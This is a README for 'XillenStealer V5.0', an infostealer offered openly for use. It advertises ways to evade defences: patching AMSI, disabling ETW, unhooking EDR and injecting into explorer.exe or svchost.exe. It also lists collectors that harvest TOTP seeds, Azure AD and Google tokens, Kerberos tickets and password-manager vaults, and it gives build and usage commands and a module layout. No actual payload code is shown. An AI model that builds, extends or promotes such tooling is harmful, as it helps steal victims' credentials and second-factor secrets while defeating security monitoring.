# XillenStealer V5.0

## What's New in V5

### Evasion Module
- AMSI bypass - patching amsi.dll to disable Windows Defender scanning
- ETW disable - prevents Event Tracing logging
- API unhooking - removes EDR hooks from critical DLLs
- Process injection - inject into explorer.exe/svchost.exe

### New Collectors
- TOTP collector - Authy Desktop, Microsoft Authenticator, Chrome extensions
- SSO collector - Azure AD tokens, Kerberos tickets, Google tokens
- Password managers - 1Password, LastPass, Bitwarden, Dashlane, NordPass, KeePass

### Architecture
- Modular structure with separate evasion/collectors/utils
- Dynamic module loading system
- Logger with rotation
- Compile script for auto-build

## Building V5

```bash
python compile_v5.py
```

## Usage

```python
from stealer_v5 import XillenStealerV5

stealer = XillenStealerV5()
data = stealer.run()
```

## Module Structure

```
core/
  evasion/
    amsi_killer.py
    etw_disabler.py
    unhooker.py
    process_injection.py
  collectors/
    totp_collector.py
    sso_collector.py
    password_managers.py
  utils/
    logger.py
```

